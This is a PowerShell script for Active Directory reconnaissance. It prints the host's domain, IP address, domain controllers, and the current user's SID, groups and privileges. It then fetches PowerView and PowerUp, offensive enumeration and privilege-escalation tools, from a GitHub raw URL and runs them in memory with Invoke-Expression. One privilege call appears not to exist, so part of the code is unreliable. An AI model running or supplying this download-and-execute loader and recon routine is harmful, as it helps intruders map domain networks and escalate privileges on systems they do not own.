# Print hostname and domain name
$hostname = [System.Net.Dns]::GetHostName()
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
Write-Host "Hostname: $hostname"
Write-Host "Domain: $domain"

# Print local IP address
$ipAddress = [System.Net.Dns]::GetHostAddresses($hostname) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
Write-Host "Local IP address: $ipAddress"

# Print domain controllers
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainControllers = $domainObj.DomainControllers | Select-Object Name, IPv4Address, SiteName
Write-Host "Domain controllers:"
$domainControllers | ForEach-Object { Write-Host "  $($_.Name) ($($_.IPv4Address)) $($_.SiteName)" }

# Get current user and privileges
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$sid = $user.User.Value
$groups = $user.Groups | Select-Object Name, Sid
$privileges = [System.Security.Principal.WindowsPrincipal]::new($user).GetEffectiveRightsAndPermissions() | Select-Object Name, Value
Write-Host "Current user: $($user.Name)"
Write-Host "SID: $sid"
Write-Host "Groups:"
$groups | ForEach-Object { Write-Host "  $($_.Name) ($($_.Sid.Value))" }
Write-Host "Privileges:"
$privileges | ForEach-Object { Write-Host "  $($_.Name) ($($_.Value))" }

# Import powerview and powerup scripts from GitHub repository
$scriptDir = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(".\")
try {
    $powerviewContent = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/powerview.ps1" -UseBasicParsing -ErrorAction Stop
    Invoke-Expression $powerviewContent.Content
    Write-Host "Powerview loaded successfully"
}
catch {
    Write-Host "Could not load powerview"
}

try {
    $powerupContent = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/powerup.ps1" -UseBasicParsing -ErrorAction Stop
    Invoke-Expression $powerupContent.Content
    Write-Host "Powerup loaded successfully"
}
catch {
    Write-Host "Could not load powerup"
}
